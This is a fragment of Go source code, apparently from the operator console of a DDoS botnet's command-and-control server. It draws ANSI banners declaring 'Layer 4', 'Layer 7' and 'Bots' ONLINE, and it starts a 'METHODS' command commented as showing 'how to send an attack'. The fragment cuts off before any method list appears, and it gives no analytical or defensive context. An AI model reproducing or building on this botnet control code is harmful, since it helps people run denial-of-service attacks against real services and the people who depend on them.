...
func (this *Admin) Handle() {
    ...
    this.conn.Write([]byte("\033[1;34m ║\033[1;34m  Layer 4   > \033[1;32mONLINE                  \033[1;34m║\r\n"))                                                           
    this.conn.Write([]byte("\033[1;34m ╚══════════════════════════════════════╝\r\n"))
    time.Sleep(500 * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte("\033[1;34m ╔══════════════════════════════════════╗\r\n"))                  
    this.conn.Write([]byte("\033[1;34m ║\033[1;34m  Layer 4   > \033[1;32mONLINE                  \033[1;34m║\r\n"))  
    this.conn.Write([]byte("\033[1;34m ║\033[1;34m  Layer 7   > \033[1;32mONLINE                  \033[1;34m║\r\n"))                                               
    this.conn.Write([]byte("\033[1;34m ╚══════════════════════════════════════╝\r\n"))
    time.Sleep(500 * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte("\033[1;34m ╔══════════════════════════════════════╗\r\n"))                  
    this.conn.Write([]byte("\033[1;34m ║\033[1;34m  Layer 4   > \033[1;32mONLINE                  \033[1;34m║\r\n"))  
    this.conn.Write([]byte("\033[1;34m ║\033[1;34m  Layer 7   > \033[1;32mONLINE                  \033[1;34m║\r\n"))
    this.conn.Write([]byte("\033[1;34m ║\033[1;34m  Bots      > \033[1;32mONLINE                  \033[1;34m║\r\n"))                                                         
    this.conn.Write([]byte("\033[1;34m ╚══════════════════════════════════════╝\r\n"))
    time.Sleep(500 * time.Millisecond)
        this.conn.Write([]byte("\033[2J\033[1H"))
	...
	for {
		...
		if cmd == "METHODS" || cmd == "methods" { // display methods and how to send an attack
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\x1b[1;35mmethod list                 \r\n"))
